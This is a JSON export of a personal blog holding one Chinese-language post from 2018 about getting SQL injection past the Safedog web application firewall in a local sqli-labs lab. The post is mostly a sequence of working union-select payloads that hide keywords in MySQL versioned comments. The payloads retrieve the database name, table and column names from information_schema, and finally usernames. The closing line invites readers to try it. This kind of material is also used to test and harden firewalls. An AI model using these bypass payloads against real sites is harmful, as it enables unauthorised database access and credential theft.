{"meta":{"title":"Mlins's blog","subtitle":"What?","description":null,"author":"Mlins","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"Fuzz过狗注入","slug":"Fuzz过狗注入","date":"2018-05-31T13:13:14.000Z","updated":"2018-05-31T14:13:14.000Z","comments":true,"path":"2018/05/31/Fuzz过狗注入/","link":"","permalink":"http://yoursite.com/2018/05/31/Fuzz过狗注入/","excerpt":"春天不播种，夏天就不会生长，秋天就不能收割，冬天就不能品尝。","text":"春天不播种，夏天就不会生长，秋天就不能收割，冬天就不能品尝。 今天在虚拟机上安装一个WEB安全狗，打算绕绕狗然后也搭建一个sqli-labs注入环境先通过order by可判断字段数为3个，这里就不详细解释了当我们准备使用union select联合查询的时候，会被安全狗拦截原本打算写个脚本进行fuzz测试的，但是后来发现脚本跑出来的能绕狗，但是sql会报错，奇怪的是放入Mysql终端执行又能正常查询，没办法，只能手工fuzz测试 对于安全狗的拦截特征，个人理解是:123456因安全狗是根据特征来判断你输入的内容是否安全比如你单输入一个union不会被拦又或者你单输入一个select也不会被拦截但是如果你输入一个union select，就会被拦所以fuzz就是构造一些奇怪的字符又不会被数据库解析的东西从而来混淆安全狗的匹配规则 这里手工测试的过狗payload是:1?id=1+/*!union*//**//*!select*/+1,2,3+%23 可成功绕狗 然后就是查当前数据库名:1?id=-1+/*!union*//**//*!select*/+1,database/*!()*/,3+%23 接着查询表名，可通过修改limit 0,1的值来查询上下表1?id=-1+/*!union*//**//*!select*/+1,table_name,3+/*!from*//**//*!information_schema.tables*/+where+table_schema='security'+limit+0,1%23 继续查询字段名,可通过修改limit 0,1的值来查询上下字段1?id=-1+/*!union*//**//*!select*/+1,column_name,3+/*!from*//**//*!information_schema.columns*/+where+table_schema='security'/**//*!and*//**/table_name='users'+limit+1,1%23 最后就是查询字段内容,可通过修改limit 0,1来查询上下字段内容值1?id=-1+/*!union*//**//*!select*/+1,username,3+from+users+limit+1,1%23 是不是自己也想去试试呢？","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://yoursite.com/tags/bypass/"}],"keywords":[]}]}